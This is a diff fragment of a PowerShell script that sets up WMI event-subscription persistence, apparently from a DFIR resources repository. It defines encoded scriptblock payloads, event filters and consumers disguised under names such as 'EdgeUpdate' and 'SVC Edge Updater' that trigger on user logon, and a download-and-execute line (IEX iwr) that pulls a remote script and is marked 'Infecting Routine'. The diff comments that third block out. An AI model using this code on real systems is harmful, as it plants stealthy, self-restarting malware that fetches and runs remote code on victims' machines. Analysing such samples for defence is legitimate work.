@@ -8,12 +8,12 @@ $SecondPayload           = "& ([scriptblock]::Create([System.Text.Encoding]::Uni
 $SecondEventFilterName   = "EdgeUpdate"     # Kill lsma22
 $SecondEventConsumerName = "SVC Edge Updater"
 $SecondQuery             = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"
-
+<#
 $ThirdPayload            = "IEX (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Third.ps1 -UseBasicParsing)"
 $ThirdEventFilterName    = "SMBOperator"   # Infecting Routine
 $ThirdEventConsumerName  = "Check Uptime"
 $ThirdQuery              = "SELECT * FROM __TimerEvent WHERE TimerId='OneMinuteTimer_f71fa886-7d3f-4e66-ae34-e2dfa66f061d'"
-
+#>
 function Install-Persistence{
     
     param(
